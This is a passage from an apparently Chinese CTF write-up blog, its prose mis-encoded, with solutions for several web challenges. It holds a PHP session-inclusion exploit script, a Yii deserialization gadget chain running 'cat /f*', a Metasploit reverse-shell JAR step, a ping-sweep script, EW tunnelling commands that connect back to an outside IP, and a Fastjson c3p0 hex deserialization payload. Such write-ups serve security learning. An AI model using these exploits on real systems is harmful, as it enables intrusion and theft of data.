class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œè€Œå› ä¸ºæœ‰å¤§é‡çš„ ban æ‰çš„å‡½æ•°å¯¼è‡´äº†å¾ˆéš¾ç›´æ¥ RCE æˆ–è€…è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚</p><h4 id="PHP-SESSION-åŒ…å«"><a href="#PHP-SESSION-åŒ…å«" class="headerlink" title="PHP SESSION åŒ…å«"></a>PHP SESSION åŒ…å«</h4><p>å› ä¸ºç¨‹åºä½¿ç”¨åˆ°äº† sessionï¼Œå‡ä½¿ session.use_strict_mode ä¸º 0 åˆ™å¯ä»¥åŒ…å«åˆ° /tmp ç›®å½•ä¸‹è¢«åºåˆ—åŒ–å­˜å‚¨çš„ sessionã€‚å†™ä¸ªè„šæœ¬æ¥ä¸€æŠŠæ¢­è¾¾æˆ RCE å¹¶æ‹¿åˆ° flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://eci-2zehr586mkdtes1jcaj6.cloudeci1.ichunqiu.com&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="string">&quot;Lemon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="comment"># response = session.post(&quot;/login.php&quot;, data=&#123;</span></span><br><span class="line">    <span class="comment">#     &quot;username&quot;:&quot;a&quot;,</span></span><br><span class="line">    <span class="comment">#     &quot;password&quot;:&quot;b&quot;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"></span><br><span class="line">    response = session.post(<span class="string">&quot;/check2.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;url1&quot;</span>: <span class="string">f&quot;http://baidu.com/<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    &#125;, files=[</span><br><span class="line">        (<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;1.png&#x27;</span>, <span class="string">&quot;\x89PNG\r\n&quot;</span>, <span class="string">&#x27;application/png&#x27;</span>))</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="string">&quot;Lemon2&quot;</span>)</span><br><span class="line">    response = session.post(<span class="string">&quot;/check2.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="comment"># &quot;url1&quot;: &quot;http://127.0.0.1/admin/include123.php?u=/tmp/sess_Lemon&quot;</span></span><br><span class="line">        <span class="string">&quot;url1&quot;</span>: <span class="string">&quot;http://127.0.0.1/admin/include123.php?u=/tmp/flaaaaaag.txt&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/preview.php&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.content.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=phpinfo();?&gt;&quot;) # PHPINFO</span></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=var_dump(scandir(\&quot;/\&quot;));?&gt;&quot;) # Root Directory</span></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=system(\&quot;/g??????.sh&gt;/tmp/flaaaaaag.txt\&quot;);?&gt;&quot;) # Extract flag</span></span><br><span class="line">Exploit(<span class="string">&quot;&quot;</span>) <span class="comment"># Extract flag</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6a6fc984-0393-4a56-8ce1-8ea011d9d165&#125;</span><br></pre></td></tr></table></figure><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><blockquote><p>yiiæœ€æ–°ç‰ˆé‡Œæœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„é“¾å­ï¼Œæˆ‘å·²ç»ä»999999ä¸ªæ–‡ä»¶é‡Œï¼Œæ‹¿å‡ºäº†éƒ¨åˆ†ï¼Œä¸ä¼šè¿˜æ‰¾ä¸åˆ°å§ï¼Ÿ</p></blockquote><p>è¿™æ³¢æ˜¯å¿«ç…§é‡Œæœ‰åŸæœ¬çš„é“¾å­ã€‚</p><blockquote><p><a href="https://webcache.googleusercontent.com/search?q=cache:QjwZwIOglLAJ:https://github.com/JinYiTong/poc">https://webcache.googleusercontent.com/search?q=cache:QjwZwIOglLAJ:https://github.com/JinYiTong/poc</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>=-<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;ezyii/source/closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /f*&#x27;</span>);&#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šè¿°è„šæœ¬ï¼Œå°†æ‰€å¾—è½½è·ä»¥ POST å‚æ•° data ä¼ é€å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9c17cfff-aaab-4712-80c8-cef14ec595a5&#125;</span><br></pre></td></tr></table></figure><h3 id="å±‚å±‚ç©¿é€"><a href="#å±‚å±‚ç©¿é€" class="headerlink" title="å±‚å±‚ç©¿é€"></a>å±‚å±‚ç©¿é€</h3><h4 id="æ¶æ„-Jar-çš„ç”Ÿæˆ"><a href="#æ¶æ„-Jar-çš„ç”Ÿæˆ" class="headerlink" title="æ¶æ„ Jar çš„ç”Ÿæˆ"></a>æ¶æ„ Jar çš„ç”Ÿæˆ</h4><blockquote><p><a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p></blockquote><p>é¦–å…ˆè¿è¡Œä¸€ä¸ª metasploit å®¹å™¨ï¼ŒæŒ‰ç…§å‚è€ƒæ–‡ç« ä¸­çš„å†…å®¹ç”Ÿæˆæ¶æ„ Jarã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span> run --name metasploit5 -it docker.io/metasploitframework/metasploit-framework /bin/bash</span><br></pre></td></tr></table></figure><p>ç”¨ Submit Job å°† Jar ä¸Šä¼ åˆ°é¶æœºå¹¶æäº¤æ‰§è¡Œåå¯å¾—åå¼¹ shellã€‚</p><h4 id="å†…ç½‘æ‰«æ-amp-EW-ä»£ç†"><a href="#å†…ç½‘æ‰«æ-amp-EW-ä»£ç†" class="headerlink" title="å†…ç½‘æ‰«æ &amp; EW ä»£ç†"></a>å†…ç½‘æ‰«æ &amp; EW ä»£ç†</h4><p>ä½¿ç”¨å¦‚ä¸‹è„šæœ¬å†™å…¥ä¸€ä¸ªæ‰«æè„šæœ¬å¹¶æ‰§è¡Œï¼Œå¯ä»¥å¾—åˆ°å†…ç½‘ä¸­ 10.10.1.11:8080 å­˜åœ¨æ–°çš„ä¸šåŠ¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;for i in &#123;1..254&#125;;do&#x27;</span> &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#123;&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ping -c1 -W1 10.10.1.$i &amp;&amp; echo &quot;10.10.1.$i&quot; is alive;&#x27;</span> &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#125;&amp;&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;done&#x27;</span>  &gt;&gt; aaa.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;wait&#x27;</span>  &gt;&gt; aaa.sh</span><br></pre></td></tr></table></figure><p>å°† EW æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ ./ew -s rcsocks -l 10031 -e 10032 &amp;ï¼Œåœ¨é¶æœºä¸Šä½¿ç”¨ wget è·å–åˆ° /tmp ä¸‹å¹¶ chmod èµ‹æƒåæ‰§è¡Œ ./ew -s rssocks -d 8.136.8.210 -e 10032ã€‚æ­¤æ—¶åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨ Proxy SwitchyOmega è®¾ç½® socks5 ä»£ç†è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šè®¾å®šçš„ç«¯å£ã€‚ç»™ BurpSuite ä¹Ÿè®¾ç½®å¯¹åº”çš„ä»£ç†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629648489140912/b6a016a4462bef6cf12dd4d16630d1fbbb3ed4f6.png"></p><h4 id="Jar-åç¼–è¯‘-amp-ä¸šåŠ¡åˆ†æ"><a href="#Jar-åç¼–è¯‘-amp-ä¸šåŠ¡åˆ†æ" class="headerlink" title="Jar åç¼–è¯‘ &amp; ä¸šåŠ¡åˆ†æ"></a>Jar åç¼–è¯‘ &amp; ä¸šåŠ¡åˆ†æ</h4><blockquote><p><a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a></p></blockquote><p>ä½¿ç”¨å‚è€ƒå¤„çš„ç½‘ç«™åç¼–è¯‘é¢˜ç›®ç»™å‡ºçš„é™„ä»¶ï¼Œæ‰¾åˆ°å¦‚ä¸‹å…³é”®ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä¸€å¯¹ç”¨æˆ·åå’Œå¯†ç  admin/123456ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Decompiled by Procyon v0.5.36</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ichunqiu.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.SimpleAuthenticationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(<span class="keyword">final</span> PrincipalCollection principals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(<span class="keyword">final</span> AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> String username = (String)token.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;admin&quot;</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">&quot;\u8d26\u6237\u4e0d\u5b58\u5728!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (AuthenticationInfo)<span class="keyword">new</span> SimpleAuthenticationInfo((Object)username, (Object)<span class="string">&quot;123456&quot;</span>, <span class="keyword">this</span>.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„ç™»å½•ä¸šåŠ¡ä½¿ç”¨äº† doLogin è·¯ç”±æ¥è¿›è¡Œå¤„ç†ï¼Œåœ¨ LoginController ä¸­å¯ä»¥çœ‹åˆ°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123; &quot;/doLogin&quot; &#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doLogin</span><span class="params">(<span class="keyword">final</span> String username, <span class="keyword">final</span> String password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        subject.login((AuthenticationToken)<span class="keyword">new</span> UsernamePasswordToken(username, password));</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„ä¸šåŠ¡ä»£ç å¦‚ä¸‹ï¼Œå¯¹æäº¤çš„å†…å®¹ä½¿ç”¨äº† Fastjson æ¥å¤„ç†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Decompiled by Procyon v0.5.36</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> ichunqiu.web.springshiro.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123; &quot;/&quot; &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String[] blacklist;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastjsonTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blacklist = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;JdbcRowSetImpl&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">waf</span><span class="params">(<span class="keyword">final</span> String payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (payload.contains(<span class="string">&quot;\\x&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (payload.contains(<span class="string">&quot;\\u&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> String key : <span class="keyword">this</span>.blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (payload.contains(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&#123; &quot;/admin/test&quot; &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">(<span class="meta">@RequestBody</span> <span class="keyword">final</span> String json)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.waf(json)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Oh,you can&#x27;t do that&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (json.length() &lt; <span class="number">20000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Oh,you are too short&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶å¯¹ä¼ å…¥çš„å‚æ•°é•¿åº¦è¿›è¡Œäº†è¦æ±‚ï¼ŒJSON çš„é•¿åº¦éœ€è¦å¤§äº 20000ï¼ŒåŒæ—¶è¿›è¡Œäº†ä¸€äº›è¿‡æ»¤ã€‚</p><h4 id="Fastjson-c3p0"><a href="#Fastjson-c3p0" class="headerlink" title="Fastjson c3p0"></a>Fastjson c3p0</h4><blockquote><p><a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p></blockquote><p>ç™»å½•åè®¿é—® /admin/test è·¯ç”±ï¼Œä½¿ç”¨å‚è€ƒä¸­çš„ payloadï¼Œå°† f é‡å¤å‡ æ¬¡ä»¥æ»¡è¶³é•¿åº¦è¦æ±‚ã€‚ä½¿ç”¨ BurpSuite å‘é€æ•°æ®åŒ…å³å¯è·å¾— flagã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;e&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&#125;,<span class="attr">&quot;f&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<span class="attr">&quot;userOverridesAsString&quot;</span>:<span class="string">&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E6